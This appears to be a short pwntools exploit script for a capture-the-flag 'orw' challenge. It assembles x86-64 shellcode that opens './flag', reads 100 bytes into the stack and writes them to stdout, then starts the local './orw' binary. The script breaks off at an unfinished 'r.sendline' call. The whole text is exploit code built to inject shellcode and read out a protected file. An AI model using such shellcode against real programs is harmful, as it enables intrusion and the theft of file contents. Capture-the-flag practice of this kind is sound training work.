#coding=utf-8
from pwn import *

shell = shellcraft.pushstr('./flag')
shell += shellcraft.open('rsp', 0, 0)
shell += shellcraft.read('rax', 'rsp', 100)
shell += shellcraft.write(1, 'rsp', 100)
shell = asm(shell)

r = process('./orw')
r.sendline
